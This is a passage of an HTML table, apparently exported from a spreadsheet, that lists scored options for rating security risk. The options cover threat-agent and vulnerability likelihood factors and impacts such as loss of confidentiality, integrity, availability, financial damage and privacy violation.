		<td align="left" valign=middle>Difficult [3]</td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
		<td align="left" valign=middle>Hidden [4]</td>
		<td align="right" valign=middle sdval="4" sdnum="1033;">4</td>
		<td align="left" valign=middle>Logged and reviewed [3]</td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Advanced computer user [5]</td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=middle>High reward [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>No access or resources required [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>Partners [5]</td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=middle>Easy [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>Easy [5]</td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=middle>Obvious [6]</td>
		<td align="right" valign=middle sdval="6" sdnum="1033;">6</td>
		<td align="left" valign=middle>Logged without review [8]</td>
		<td align="right" valign=middle sdval="8" sdnum="1033;">8</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Network and programming skills [6]</td>
		<td align="right" valign=middle sdval="6" sdnum="1033;">6</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle>Authenticated users [6]</td>
		<td align="right" valign=middle sdval="6" sdnum="1033;">6</td>
		<td align="left" valign=middle>Automated tools available [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>Automated tools available [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>Public knowledge [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>Not logged [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Security penetration skills [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle>Anonymous Internet users [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=middle><b><font face="Calibri" color="#000000">Loss of confidentiality</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Loss of Integrity</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Loss of Availability</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Loss of Accountability</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Financial damage</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Reputation damage</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Non-Compliance</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Privacy violation</font></b></td>
		<td align="left" valign=bottom><b><font face="Calibri" color="#000000"><br></font></b></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Minimal non-sensitive data disclosed [2]</td>
		<td align="right" valign=middle sdval="2" sdnum="1033;">2</td>
		<td align="left" valign=middle>Minimal slightly corrupt data [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Minimal secondary services interrupted [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Attack fully traceable to individual [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Damage costs less than to fix the issue [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Minimal damage [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Minor violation [2]</td>
		<td align="right" valign=middle sdval="2" sdnum="1033;">2</td>
		<td align="left" valign=middle>One individual [3]</td>
		<td align="right" valign=bottom sdval="3" sdnum="1033;">3</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Extensive non-sensitive data disclosed [6]</td>
		<td align="right" valign=middle sdval="6" sdnum="1033;">6</td>
		<td align="left" valign=middle>Minimal seriously corrupt data [3]</td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
		<td align="left" valign=middle>Minimal primary services interrupted [5]</td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=middle>Attack possibly traceable to individual [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>Minor effect on annual profit [3]</td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
		<td align="left" valign=middle>Loss of major accounts [4]</td>
		<td align="right" valign=middle sdval="4" sdnum="1033;">4</td>
		<td align="left" valign=middle>Clear violation [5]</td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=middle>Hundreds of people [5]</td>
		<td align="right" valign=bottom sdval="5" sdnum="1033;">5</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Extensive critical data disclosed [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>Extensive slightly corrupt data [5]</td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=middle>Extensive primary services interrupted [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>Attack completely anonymous [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>Significant effect on annual profit [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>Loss of goodwill [5]</td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=middle>High profile violation [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>Thousands of people [7]</td>
		<td align="right" valign=bottom sdval="7" sdnum="1033;">7</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>All data disclosed [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>Extensive seriously corrupt data [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>All services completely lost [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle>Backruptcy [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle>Brand damage [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle>Millions of people [9]</td>
		<td align="right" valign=bottom sdval="9" sdnum="1033;">9</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle>All data totally corrupt [9]</td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
</table>
<!-- ************************************************************************** -->
